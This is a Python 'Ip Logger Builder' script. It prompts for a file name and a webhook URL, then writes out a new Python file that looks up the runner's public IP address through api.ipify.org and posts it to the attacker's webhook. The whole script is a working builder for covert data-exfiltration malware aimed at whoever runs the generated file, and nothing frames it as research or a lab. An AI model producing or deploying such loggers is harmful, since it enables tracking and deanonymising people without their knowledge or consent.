try:
    import os
    from os import system
    system("title " + "Ip Logger Builder")
except:
    pass
try:
    import os
except Exception:
    pass
try:
    import requests
except Exception:
    while True:
        e = input("Requests Module Missing, Wanna Try Auto Fix It (y/n): ")
        if e == "y" or e == "n":
            break
        else:
            print("Enter A Valid Choice")
    if e == "n":
        exit()
    if e == "y":
        try:
            os.system("pip install requests")
            print("It Shod Be Fixed Now, Press Enter To Start Main Program")
            input("")
        except Exception:
            print("Error Fixing, Press Enter To Close Program")
            input("")
            exit()
while True:
    name = input("Enter File Name: ")
    temp = len(name)
    if int(temp) > 135:
        print("To Long Name")
    if int(temp) < 135:
        break
while True:
    try:
        webhook = input("Enter Webhook: ")
        r = requests.get(webhook)
        if "200" in str(r):
            break
        if "200" not in str(r):
            print("Webhook Invalid")
    except Exception:
        print("Webhook Invalid")
try:
    file = open(f"{name}.py", "a")
    file.write("import requests\n")
    file.write(f'webhook = "{webhook}"\n')
    file.write('url = "https://api.ipify.org"\n')
    file.write("r = requests.get(url).text\n")
    file.write("r = str(r)\n")
    file.write('requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})')
    file.close()
except:
    print("Unkown Error")
    input("")
    exit()


print("Succsesfully Made File")
input("")
exit()
